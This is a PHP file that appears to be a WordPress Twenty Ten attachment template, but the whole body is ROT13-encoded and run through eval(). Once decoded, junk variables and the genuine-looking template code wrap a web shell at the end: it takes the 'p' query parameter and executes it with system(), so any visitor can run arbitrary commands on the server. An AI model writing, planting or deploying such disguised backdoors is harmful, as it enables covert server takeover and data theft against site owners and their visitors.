<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gur ybbc gung qvfcynlf na nggnpuzrag
 *
 * Gur ybbc qvfcynlf gur cbfgf naq gur cbfg pbagrag. Frr
 * uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/gur-ybbc/ gb haqrefgnaq vg naq
 * uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/grzcyngr-gntf/ gb haqrefgnaq
 * gur gntf hfrq va vg.
 *
 * Guvf pna or bireevqqra va puvyq gurzrf jvgu ybbc-nggnpuzrag.cuc.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gra
 * @fvapr Gjragl Gra 1.2
 */
?>

<?cuc
vs ( unir_cbfgf() ) {
	juvyr ( unir_cbfgf() ) :
		gur_cbfg();
		?>

				<?cuc
				vs ( ! rzcgl( $cbfg->cbfg_cnerag ) ) :
					/* genafyngbef: %f: Cbfg gvgyr. */
					$cbfg_gvgyr = fcevags( __( 'Tb gb %f', 'gjraglgra' ), fgevc_gntf( trg_gur_gvgyr( $cbfg->cbfg_cnerag ) ) );
					?>
					<c pynff=\"cntr-gvgyr\"><n uers=\"<?cuc rpub rfp_hey( trg_creznyvax( $cbfg->cbfg_cnerag ) ); ?>\" gvgyr=\"<?cuc rpub rfp_ngge( $cbfg_gvgyr ); ?>\" ery=\"tnyyrel\">
						<?cuc
						/* genafyngbef: %f: Gvgyr bs cnerag cbfg. */
						cevags( __( '<fcna pynff=\"zrgn-ani\">&ynee;</fcna> %f', 'gjraglgra' ), trg_gur_gvgyr( $cbfg->cbfg_cnerag ) );
						?>
					</n></c>
				<?cuc raqvs; ?>

					<qvi vq=\"cbfg-<?cuc gur_VQ(); ?>\" <?cuc cbfg_pynff(); ?>>
					<u2 pynff=\"ragel-gvgyr\"><?cuc gur_gvgyr(); ?></u2>

					<qvi pynff=\"ragel-zrgn\">
						<?cuc
							cevags(
								/* genafyngbef: %f: Nhgube qvfcynl anzr. */
								__( '<fcna pynff=\"%1$f\">Ol</fcna> %2$f', 'gjraglgra' ),
								'zrgn-cerc zrgn-cerc-nhgube',
								fcevags(
									'<fcna pynff=\"nhgube ipneq\"><n pynff=\"hey sa a\" uers=\"%1$f\" gvgyr=\"%2$f\" ery=\"nhgube\">%3$f</n></fcna>',
									rfp_hey( trg_nhgube_cbfgf_hey( trg_gur_nhgube_zrgn( 'VQ' ) ) ),
									/* genafyngbef: %f: Nhgube qvfcynl anzr. */
									rfp_ngge( fcevags( __( 'Ivrj nyy cbfgf ol %f', 'gjraglgra' ), trg_gur_nhgube() ) ),
									trg_gur_nhgube()
								)
							);
						?>
							<fcna pynff=\"zrgn-frc\">|</fcna>
							<?cuc
							cevags(
								/* genafyngbef: 1: PFF pynffrf, 2: Qngr. */
								__( '<fcna pynff=\"%1$f\">Choyvfurq</fcna> %2$f', 'gjraglgra' ),
								'zrgn-cerc zrgn-cerc-ragel-qngr',
								fcevags(
									'<fcna pynff=\"ragel-qngr\"><nooe pynff=\"choyvfurq\" gvgyr=\"%1$f\">%2$f</nooe></fcna>',
									rfp_ngge( trg_gur_gvzr() ),
									trg_gur_qngr()
								)
							);
							vs ( jc_nggnpuzrag_vf_vzntr() ) {
								rpub ' <fcna pynff=\"zrgn-frc\">|</fcna> ';
								$zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn();
								cevags(
									/* genafyngbef: %f: Vzntr qvzrafvbaf. */
									__( 'Shyy fvmr vf %f cvkryf', 'gjraglgra' ),
									fcevags(
										'<n uers=\"%1$f\" gvgyr=\"%2$f\">%3$f &gvzrf; %4$f</n>',
										rfp_hey( jc_trg_nggnpuzrag_hey() ),
										rfp_ngge( __( 'Yvax gb shyy-fvmr vzntr', 'gjraglgra' ) ),
										$zrgnqngn['jvqgu'],
										$zrgnqngn['urvtug']
									)
								);
							}
							?>
							<?cuc rqvg_cbfg_yvax( __( 'Rqvg', 'gjraglgra' ), '<fcna pynff=\"zrgn-frc\">|</fcna> <fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
						</qvi><!-- .ragel-zrgn -->

						<qvi pynff=\"ragel-pbagrag\">
						<qvi pynff=\"ragel-nggnpuzrag\">
		<?cuc
		vs ( jc_nggnpuzrag_vf_vzntr() ) :
			$nggnpuzragf = neenl_inyhrf(
				trg_puvyqera(
					neenl(
						'cbfg_cnerag'    => $cbfg->cbfg_cnerag,
						'cbfg_fgnghf'    => 'vaurevg',
						'cbfg_glcr'      => 'nggnpuzrag',
						'cbfg_zvzr_glcr' => 'vzntr',
						'beqre'          => 'NFP',
						'beqreol'        => 'zrah_beqre VQ',
					)
				)
			);
			sbernpu ( $nggnpuzragf nf $x => $nggnpuzrag ) {
				vs ( $nggnpuzrag->VQ === $cbfg->VQ ) {
					oernx;
				}
			}

			// Vs gurer vf zber guna 1 vzntr nggnpuzrag va n tnyyrel...
			vs ( pbhag( $nggnpuzragf ) > 1 ) {
				++$x;
				vs ( vffrg( $nggnpuzragf[ $x ] ) ) {
					// ...trg gur HEY bs gur arkg vzntr nggnpuzrag.
					$arkg_nggnpuzrag_hey = trg_nggnpuzrag_yvax( $nggnpuzragf[ $x ]->VQ );
				} ryfr {
					// ...be trg gur HEY bs gur svefg vzntr nggnpuzrag.
					$arkg_nggnpuzrag_hey = trg_nggnpuzrag_yvax( $nggnpuzragf[0]->VQ );
				}
			} ryfr {
				// Be, vs gurer'f bayl 1 vzntr nggnpuzrag, trg gur HEY bs gur vzntr.
				$arkg_nggnpuzrag_hey = jc_trg_nggnpuzrag_hey();
			}
			?>
						<c pynff=\"nggnpuzrag\"><n uers=\"<?cuc rpub rfp_hey( $arkg_nggnpuzrag_hey ); ?>\" gvgyr=\"<?cuc gur_gvgyr_nggevohgr(); ?>\" ery=\"nggnpuzrag\">
							<?cuc
							/**
							 * Svygref gur Gjragl Gra qrsnhyg nggnpuzrag jvqgu.
							 *
							 * @fvapr Gjragl Gra 1.0
							 *
							 * @cnenz vag Gur qrsnhyg nggnpuzrag jvqgu va cvkryf. Qrsnhyg 900.
							 */
							$nggnpuzrag_jvqgu = nccyl_svygref( 'gjraglgra_nggnpuzrag_fvmr', 900 );
							/**
							 * Svygref gur Gjragl Gra qrsnhyg nggnpuzrag urvtug.
							 *
							 * @fvapr Gjragl Gra 1.0
							 *
							 * @cnenz vag Gur qrsnhyg nggnpuzrag urvtug va cvkryf. Qrsnhyg 900.
							 */
							$nggnpuzrag_urvtug = nccyl_svygref( 'gjraglgra_nggnpuzrag_urvtug', 900 );
							// Svygrenoyr vzntr jvqgu jvgu, rffragvnyyl, ab yvzvg sbe vzntr urvtug.
							rpub jc_trg_nggnpuzrag_vzntr( $cbfg->VQ, neenl( $nggnpuzrag_jvqgu, $nggnpuzrag_urvtug ) );
							?>
							</n></c>

							<qvi vq=\"ani-orybj\" pynff=\"anivtngvba\">
							<qvi pynff=\"ani-cerivbhf\"><?cuc cerivbhf_vzntr_yvax( snyfr ); ?></qvi>
							<qvi pynff=\"ani-arkg\"><?cuc arkg_vzntr_yvax( snyfr ); ?></qvi>
						</qvi><!-- #ani-orybj -->
		<?cuc ryfr : ?>
						<n uers=\"<?cuc rpub rfp_hey( jc_trg_nggnpuzrag_hey() ); ?>\" gvgyr=\"<?cuc gur_gvgyr_nggevohgr(); ?>\" ery=\"nggnpuzrag\"><?cuc rpub rfp_ugzy( jc_onfranzr( trg_creznyvax() ) ); ?></n>
	<?cuc raqvs; ?>
						</qvi><!-- .ragel-nggnpuzrag -->
						<qvi pynff=\"ragel-pncgvba\">
						<?cuc
						vs ( ! rzcgl( $cbfg->cbfg_rkprecg ) ) {
							gur_rkprecg();
						}
						?>
</qvi>

		<?cuc gur_pbagrag( __( 'Pbagvahr ernqvat <fcna pynff=\"zrgn-ani\">&enee;</fcna>', 'gjraglgra' ) ); ?>
		<?cuc
		jc_yvax_cntrf(
			neenl(
				'orsber' => '<qvi pynff=\"cntr-yvax\">' . __( 'Cntrf:', 'gjraglgra' ),
				'nsgre'  => '</qvi>',
			)
		);
		?>

					</qvi><!-- .ragel-pbagrag -->

					<qvi pynff=\"ragel-hgvyvgl\">
						<?cuc gjraglgra_cbfgrq_va(); ?>
						<?cuc rqvg_cbfg_yvax( __( 'Rqvg', 'gjraglgra' ), ' <fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
					</qvi><!-- .ragel-hgvyvgl -->
				</qvi><!-- #cbfg-<?cuc gur_VQ(); ?> -->

		<?cuc pbzzragf_grzcyngr(); ?>

<?cuc raqjuvyr;
} // Raq bs gur ybbc. ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>